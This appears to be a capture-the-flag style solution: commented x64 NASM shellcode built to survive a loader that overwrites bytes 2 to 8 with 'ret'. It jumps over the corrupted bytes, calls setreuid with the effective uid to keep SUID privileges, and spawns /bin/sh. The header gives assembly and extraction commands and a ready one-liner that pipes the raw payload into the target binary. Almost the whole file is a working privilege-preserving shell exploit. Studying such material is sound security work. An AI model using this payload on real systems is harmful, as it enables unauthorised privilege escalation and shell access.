;****************************************************************************************************
; x64 execve("/bin/sh") shellcode that survives in-place byte corruption
;
; The loader reads our shellcode into a buffer, then overwrites bytes at offsets 2..8
; with 0xC3 ("ret") before calling it. Offsets 0, 1 and 9+ are left intact. We hop over the
; corrupted region, then spawn a shell. setreuid() keeps the privileges when running SUID
; (otherwise the shell resets euid to ruid on startup).
;
; Assemble & extract bytes:
;		nasm -f elf64 sc.asm -o sc.o && ld sc.o -o sc           ; standalone test: ./sc
;		objcopy -O binary -j .text sc sc.bin && xxd -p sc.bin | tr -d '\n' | sed 's/../\\x&/g'
;
; Verify opcode <-> instruction mapping:
;		objdump -d sc.o
;
; Exploitation : 
; 
; (python3 -c 'import sys; sys.stdout.buffer.write(b"\xeb\x07"+b"\x90"*7+b"\x6a\x6b\x58\x0f\x05\x48\x89\xc7
; \x48\x89\xc6\x6a\x71\x58\x0f\x05\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7
; \x48\x31\xd2\x6a\x3b\x58\x0f\x05")'; cat) | ./binary
;
;****************************************************************************************************


BITS 64

_start:


; --- Go around the corruption ---
; Bytes 2..8 get clobbered with 0xC3, so we place a short jump in the untouched bytes 0..1.
; "jmp rel8" counts from the end of the jump (offset 2), so +7 lands us on offset 9.
; NASM computes the +7 itself from the 7 filler bytes below.
;
; "jmp go" <=> "\xEB\x07"

jmp go
db 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90    ; offsets 2..8: filler, eaten by the 0xC3 writes


go:


; --- Keep privileges: setreuid(geteuid(), geteuid()) ---
; On a SUID binary the shell drops euid to ruid unless ruid == euid, so we align them first.
; push/pop is used everywhere to load syscall numbers without null bytes.
;
; geteuid = 107 (0x6B), setreuid = 113 (0x71)

push 107
pop rax
syscall                 ; rax = euid
mov rdi, rax            ; ruid = euid
mov rsi, rax            ; euid = euid
push 113
pop rax
syscall


; --- execve("/bin//sh", NULL, NULL) ---
; The string is built on the stack (no hardcoded address). "/bin//sh" is exactly 8 bytes and the
; double slash is harmless, which avoids a null byte in the middle of the path.
;
; execve = 59 (0x3B)

xor rsi, rsi            ; argv = NULL
push rsi                ; string terminator \0
mov rdi, 0x68732f2f6e69622f   ; "/bin//sh" little-endian
push rdi
mov rdi, rsp            ; rdi -> "/bin//sh"
xor rdx, rdx            ; envp = NULL
push 59
pop rax
syscall
